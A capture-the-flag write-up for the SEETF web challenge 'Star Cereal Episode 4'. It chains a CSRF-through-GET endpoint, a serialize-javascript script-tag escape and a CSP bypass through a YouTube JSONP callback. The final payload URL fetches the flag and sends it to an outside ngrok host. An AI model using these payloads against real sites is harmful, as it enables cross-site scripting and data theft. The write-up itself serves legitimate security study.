# Star Cereal Episode 4 - A New Pigeon

**Author**: zeyu2001

**Category**: Web

Flag: `SEE{why_d0_p30pl3_s3r1al1z3_j4v4scr1pt...}`

## Description

Princess Rainbowpigeon gets abducted by the insidious Darth CON. Luke Skywalker merges teams with a Jedi Knight, a pilot and two droids to free her and to save the galaxy from the violent CTFtime weight vote. But I still can't find my cereal...

Note: the target page is `http://starcereal.web.seetf.sg:1337`.

## Difficulty

Medium

## Solution

1. The `/set` endpoint allows CSRF through GET requests, even though the intended usage by the app is through POST requests.

```javascript
app.all('/set', (req, res) => {
    req.session.username = req.param('username');
    req.session.cereal = req.param('cereal');
    res.redirect('/');
});
```
 
2. (Currently) unfixed vulnerability in [serialize-javascript](https://github.com/yahoo/serialize-javascript). Threw in [xss-filters](https://github.com/YahooArchive/xss-filters) just for fun (thanks Yahoo).

serialize-javascript attempts to sanitize `</script>` in the serialized object, but fails to do so when a non-http URL object is used. `xssFilters.inDoubleQuotedAttr` prevents us from escaping the double quotes, but we can still escape the script tag with `x:</script>`.

3. Bypass the CSP. We could make use of a JSONP endpoint on `www.youtube.com`.

```javascript
res.set("Content-Security-Policy", "default-src 'self' www.youtube.com 'nonce-" + nonce + "'");
```

This can be bypassed with `<script src='https://www.youtube.com/oembed?callback=alert();'>` which loads the following.

```javascript
// API callback
alert();({
  "error": {
    "code": 400,
    "message": "Invalid JSONP callback name: 'alert();'; only alphabet, number, '_', '$', '.', '[' and ']' are allowed.",
    "status": "INVALID_ARGUMENT"
  }
}
);
```

Example XSS payload: `/set?username=test&cereal=x:</script><script src='https://www.youtube.com/oembed?callback=alert(document.domain);'>`

Full solution:

```
http://starcereal.web.seetf.sg:1337/set?username=test&cereal=x:</script><script src='https://www.youtube.com/oembed?callback=fetch(`/flag`).then(function(r){return r.text()}).then(function(d){window.location=`https://d6be-175-156-124-45.ngrok-free.app?${d}`});'>
```